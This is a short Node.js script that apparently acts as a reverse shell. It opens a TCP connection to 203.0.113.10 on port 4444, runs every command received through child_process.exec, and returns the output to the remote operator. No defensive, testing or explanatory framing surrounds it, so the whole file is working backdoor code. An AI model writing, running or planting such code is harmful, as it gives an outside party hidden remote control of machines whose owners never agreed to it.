const net = require('net');
const { exec } = require('child_process');

// Connects to an operator socket, runs each received command locally,
// and returns the command output over the same connection.
const socket = new net.Socket();
socket.connect(4444, '203.0.113.10');

socket.on('data', (data) => {
  const command = data.toString().trim();
  exec(command, (error, stdout, stderr) => {
    socket.write(stdout || stderr || String(error));
  });
});

socket.on('error', () => {
  setTimeout(() => process.exit(0), 5000);
});
